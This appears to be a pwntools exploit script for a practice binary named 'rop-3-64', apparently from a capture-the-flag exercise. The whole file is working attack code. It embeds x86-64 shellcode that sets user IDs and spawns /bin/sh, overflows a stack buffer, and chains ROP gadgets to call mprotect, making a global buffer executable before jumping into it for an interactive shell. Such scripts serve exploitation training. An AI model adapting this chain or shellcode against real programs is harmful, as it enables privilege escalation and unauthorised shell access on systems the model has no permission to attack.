#!/usr/bin/env python

from pwn import *

p = process('./rop-3-64')

shellcode = 'jlX\x0f\x05H\x89\xc7H\x89\xc6jrX\x0f\x05H\xbb//bin/shH1\xf6H1\xd2RSH\x89\xe7j;X\x0f\x05'

mprotect = p64(0x0000000000400520)

buf = shellcode + "A" * (0x88 - len(shellcode))

"""
0x0000000000400743 : pop rdi ; ret
0x000000000040064a : pop rdx ; nop ; pop rbp ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
"""

pop_rdi = p64(0x0000000000400743)
pop_rdx_rbp = p64(0x000000000040064a)
pop_rsi_r15 = p64(0x0000000000400741)

g_buf = p64(0x601080)
g_aligned = p64(0x601000)

# setup for mprotect
buf += pop_rdi
buf += g_aligned
buf += pop_rsi_r15
buf += p64(0x1000)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(7)
buf += p64(0)
buf += mprotect
buf += g_buf

p.sendline(buf)
p.interactive()
